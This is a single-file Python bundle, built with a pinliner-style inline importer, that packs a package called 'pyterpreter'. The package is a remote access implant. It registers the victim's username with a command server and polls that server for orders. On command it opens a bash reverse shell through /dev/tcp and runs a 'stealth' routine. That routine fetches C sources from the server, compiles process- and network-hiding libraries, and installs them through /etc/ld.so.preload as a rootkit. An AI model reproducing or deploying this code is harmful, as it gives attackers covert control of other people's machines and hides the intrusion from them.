import os
import sys
import types

PINLINED_DEFAULT_PACKAGE = 'pyterpreter'
PINLINER_MODULE_NAME = 'pinliner_loader'
loader_version = '0.2.1'

FORCE_EXC_HOOK = None

inliner_importer_code = '''
import imp
import marshal
import os
import struct
import sys
import types


class InlinerImporter(object):
    version = '%(loader_version)s'
    def __init__(self, data, datafile, set_excepthook=True):
        self.data = data
        self.datafile = datafile
        if set_excepthook:
            sys.excepthook = self.excepthook

    @staticmethod
    def excepthook(type, value, traceback):
        import traceback as tb
        tb.print_exception(type, value, traceback)

    def find_module(self, fullname, path):
        module = fullname in self.data
        if module:
            return self

    def get_source(self, fullname):
        __, start, end, ts = self.data[fullname]
        with open(self.datafile) as datafile:
            datafile.seek(start)
            code = datafile.read(end - start)
        return code

    def get_code(self, fullname, filename):
        py_ts = self.data[fullname][3]
        try:
            with open(fullname + '.pyc', 'rb') as pyc:
                pyc_magic = pyc.read(4)
                pyc_ts = struct.unpack('<I', pyc.read(4))[0]
                if pyc_magic == imp.get_magic() and pyc_ts == py_ts:
                    return marshal.load(pyc)
        except:
            pass

        code = self.get_source(fullname)
        compiled_code = compile(code, filename, 'exec')

        try:
            with open(fullname + '.pyc', 'wb') as pyc:
                pyc.write(imp.get_magic())
                pyc.write(struct.pack('<I', py_ts))
                marshal.dump(compiled_code, pyc)
        except:
            pass
        return compiled_code

    def load_module(self, fullname):
        # If the module it's already in there we'll reload but won't remove the
        # entry if we fail
        exists = fullname in sys.modules

        module = types.ModuleType(fullname)
        module.__loader__ = self

        is_package = self.data[fullname][0]
        path = fullname.replace('.', os.path.sep)
        if is_package:
            module.__package__ = fullname
            module.__file__ = os.path.join(path, '__init__.py')
            module.__path__ = [path]
        else:
            module.__package__ = fullname.rsplit('.', 1)[0]
            module.__file__ = path + '.py'

        sys.modules[fullname] = module

        try:
            compiled_code = self.get_code(fullname, module.__file__)
            exec(compiled_code, module.__dict__)
        except:
            if not exists:
                del sys.modules[fullname]
            raise

        return module
''' % {'loader_version': loader_version}

'''
import urllib.error
import urllib.request
from queue import SimpleQueue
from threading import Thread
import time

from core.message import Message

from pyterpreter import config

_messages_to_send: 'SimpleQueue[Message]' = SimpleQueue()
messages_received: 'SimpleQueue[Message]' = SimpleQueue()

_base_url = f'http://{config.LOCAL_IP}:{config.WEBSERVER_PORT}'


def initialise():
    def receive_messages_forever():
        while True:
            time.sleep(3)
            try:
                poll_messages = urllib.request.urlopen(f'{_base_url}/instances/{config.INSTANCE_ID}')

            except urllib.error.HTTPError as ex:
                if ex.code == 404:
                    create_instance()
                else:
                    f'Unknown HTTP Error: {ex.code}: {ex.reason}'

            except urllib.error.URLError as ex:
                if len(ex.args) > 0 and isinstance(ex.args[0], ConnectionRefusedError):
                    pass  # connection refused (ie web_server down):
                else:
                    raise ex

            else:
                data = poll_messages.read().decode()
                if len(data) > 0:
                    messages_received.put(Message.from_string(data))

    def send_messages_forever():
        while True:
            message = _messages_to_send.get()
            urllib.request.urlopen(f'{_base_url}/instances/{config.INSTANCE_ID}', message.to_string().encode())

    create_instance()
    Thread(target=receive_messages_forever, daemon=True).start()
    Thread(target=send_messages_forever, daemon=True).start()
    print('comms initialised')


def create_instance():
    create_instance_res = urllib.request.urlopen(urllib.request.Request(f'{_base_url}/instances', f'{config.USERNAME}'.encode(), {'Content-Type': 'text/plain'}))
    instance_id = create_instance_res.read().decode()
    assert instance_id is not None and len(instance_id) > 0
    config.INSTANCE_ID = instance_id
    print(f'Instance created at {instance_id}')
import os
from queue import SimpleQueue
import tempfile


from core.message import Message, MESSAGE_PURPOSE

from pyterpreter import config
from pyterpreter.util import *


def process_messages_forever(messages_received_queue: 'SimpleQueue[Message]'):
    while True:
        message = messages_received_queue.get()
        print(f'Received message {message}')

        if message.purpose == MESSAGE_PURPOSE.OPEN_SHELL:
            _do_open_shell(int(message.args[0]))

        elif message.purpose == MESSAGE_PURPOSE.STEALTH:
            _do_stealth()


def _do_open_shell(port: int):
    _run_command_detached(f'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1')


def _do_stealth():
    has_gcc_code = process_get_cmd_output('gcc --version')[0]
    network_hider_filename = '/usr/local/lib/libld.so'
    process_hider_filename = '/usr/local/lib/libc.so'
    if not os.path.isdir(os.path.dirname(network_hider_filename)):
        network_hider_filename = tempfile.mkstemp()[1]
    if not os.path.isdir(os.path.dirname(process_hider_filename)):
        process_hider_filename = tempfile.mkstemp()[1]

    if has_gcc_code == 0:
        print('Building stealth exploits from source')
        network_hider_source_fd, network_hider_source_filename = tempfile.mkstemp(suffix='.c')
        process_hider_source_fd, process_hider_source_filename = tempfile.mkstemp(suffix='.c')
        network_hider_source = resource_get('stealth_network_hider.c')
        process_hider_source = resource_get('stealth_process_hider.c')
        os.write(network_hider_source_fd, network_hider_source)
        os.write(process_hider_source_fd, process_hider_source)
        os.close(network_hider_source_fd)
        os.close(process_hider_source_fd)

        assert 0 == process_get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0], 'Building network hider failed'
        assert 0 == process_get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0], 'Building process hider failed'

        os.unlink(network_hider_source_filename)
        os.unlink(process_hider_source_filename)

    else:
        raise Exception('gcc is not installed')
        # log('gcc not installed so using prebuilt libraries')
        # with open(network_hider_filename, 'wb+') as fh:
        #     fh.write(MessageProcessor.get_resource('stealth', 'network_hider.so'))
        #     fh.truncate()
        # with open(process_hider_filename, 'wb+') as fh:
        #     fh.write(MessageProcessor.get_resource('stealth', 'process_hider.so'))

    with open('/etc/ld.so.preload', 'w+') as fh:
        fh.write(f'{network_hider_filename}\n{process_hider_filename}\n')
        fh.truncate()

    print(f'Stealth injection successful, current process PID is {os.getpid()}')


def _run_command_detached(command: str):
    proc = subprocess.Popen('/bin/bash', stdin=subprocess.PIPE)
    proc.stdin.write(f'{command} &\nexit\n'.encode())
    proc.communicate()
import os
import pwd

LOCAL_IP = os.environ['PYTERPRETER_LOCAL_IP']
WEBSERVER_PORT = 1337
INSTANCE_ID: str = None
USERNAME = pwd.getpwuid(os.getuid()).pw_name
if __name__ == '__main__':
    from pyterpreter import config
    from pyterpreter.run import run
    run()
import subprocess
import urllib.request

from pyterpreter import config


def process_get_cmd_output(cmd: str, strip_new_line=False) -> [int, bytes]:
    proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    if strip_new_line and len(proc.stdout) > 0 and proc.stdout[-1] == b'\n'[0]:
        return proc.returncode, bytes(proc.stdout[:-1])
    else:
        return proc.returncode, proc.stdout


def process_is_running_with_pid(pid: str):
    grep = process_get_cmd_output(f'ps -ax -o pid | grep {pid}')[1]
    return len(grep) > 0


def resource_get(name: str) -> bytes:
    return urllib.request.urlopen(f'http://{config.LOCAL_IP}:{config.WEBSERVER_PORT}/resources/{name}').read()
from pyterpreter import communication, message_processor
from pyterpreter import config


def run():
    print(f'username is {config.USERNAME}')
    communication.initialise()
    message_processor.process_messages_forever(communication.messages_received)
from typing import Iterable, List, Optional
from base64 import b64encode, b64decode
import random
import string


class MESSAGE_PURPOSE:
    PING, OPEN_SHELL, RUN_SCRIPT, STEALTH = [str(i) for i in range(4)]


class Message:
    # source_instance_id: str
    # destination_instance_id: str
    purpose: str
    args: List[bytes]
    message_id: str
    reply_message_id: Optional[str]

    def __init__(self, purpose: str, args: Optional[Iterable[bytes]] = None, message_id: str = None, reply_message_id: Optional[str] = None):
        self.purpose = purpose
        self.args = list(args) if args is not None else []
        self.message_id = message_id if message_id is not None else ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.reply_message_id = reply_message_id

    def to_string(self) -> str:
        return ':'.join([b64encode(prop.encode()).decode() for prop in (
            self.purpose,
            ':'.join([b64encode(arg).decode() for arg in self.args]),
            self.message_id,
            self.reply_message_id if self.reply_message_id is not None else ''
        )])

    @classmethod
    def from_string(cls, line: str) -> 'Message':
        props = [b64decode(prop).decode() for prop in line.split(':')]
        props_formatted = [
                props[0],
                tuple(b64decode(arg) for arg in props[1].split(':')),
                props[2],
                props[3] if props[3] != '' else None,
        ]
        return cls(*props_formatted)

    def __str__(self):
        return f'{self.message_id}:{self.purpose}:{self.args}'
'''


inliner_packages = {
    "pyterpreter.communication": [
        0, 2788, 4792, 1630331742],
    "pyterpreter.message_processor": [
        0, 4792, 7800, 1629365020],
    "pyterpreter.config": [
        0, 7800, 7959, 1630232026],
    "pyterpreter": [
        1, 7959, 8067, 1626595632],
    "pyterpreter.util": [
        0, 8067, 8816, 1630331749],
    "pyterpreter.run": [
        0, 8816, 9072, 1630331728],
    "core.message": [
        0, 9072, 10686, 1626681783],
    "core": [
        1, 10686, 10686, 1624097201]
}


def prepare_package():
    # Loader's module name changes with each major version to be able to have
    # different loaders working at the same time.
    module_name = PINLINER_MODULE_NAME + '_' + loader_version.split('.')[0]

    # If the loader code is not already loaded we create a specific module for
    # it.  We need to do it this way so that the functions in there are not
    # compiled with a reference to this module's global dictionary in
    # __globals__.
    module = sys.modules.get(module_name)
    if not module:
        module = types.ModuleType(module_name)
        module.__package__ = ''
        module.__file__ = module_name + '.py'
        exec(inliner_importer_code, module.__dict__)
        sys.modules[module_name] = module

    # We cannot use __file__ directly because on the second run __file__ will
    # be the compiled file (.pyc) and that's not the file we want to read.
    filename = os.path.splitext(__file__)[0] + '.py'

    # Add our own finder and loader for this specific package if it's not
    # already there.
    # This must be done before we initialize the package, as it may import
    # packages and modules contained in the package itself.
    for finder in sys.meta_path:
        if (isinstance(finder, module.InlinerImporter) and
                finder.data == inliner_packages):
            importer = finder
    else:
        # If we haven't forced the setting of the uncaught exception handler
        # we replace it only if it hasn't been replace yet, this is because
        # CPython default handler does not use traceback or even linecache, so
        # it never calls get_source method to get the code, but for example
        # iPython does, so we don't need to replace the handler.
        if FORCE_EXC_HOOK is None:
            set_excepthook = sys.__excepthook__ == sys.excepthook
        else:
            set_excepthook = FORCE_EXC_HOOK

        importer = module.InlinerImporter(inliner_packages, filename,
                                          set_excepthook)
        sys.meta_path.append(importer)

    # If this is a bundle (multiple packages) without default then don't import
    # any package automatically.
    if not PINLINED_DEFAULT_PACKAGE:
        return

    __, start, end, ts = inliner_packages[PINLINED_DEFAULT_PACKAGE]
    with open(filename) as datafile:
        datafile.seek(start)
        code = datafile.read(end - start)

    # We need everything to be local variables before we clear the global dict
    def_package = PINLINED_DEFAULT_PACKAGE
    name = __name__
    filename = def_package + '/__init__.py'
    compiled_code = compile(code, filename, 'exec')

    # Prepare globals to execute __init__ code
    globals().clear()
    # If we've been called directly we cannot set __path__
    if name != '__main__':
        globals()['__path__'] = [def_package]
    else:
        def_package = None
    globals().update(__file__=filename,
                     __package__=def_package,
                     __name__=name,
                     __loader__=importer)

    exec(compiled_code, globals())


# Prepare loader's module and populate this namespace only with package's
# __init__
prepare_package()
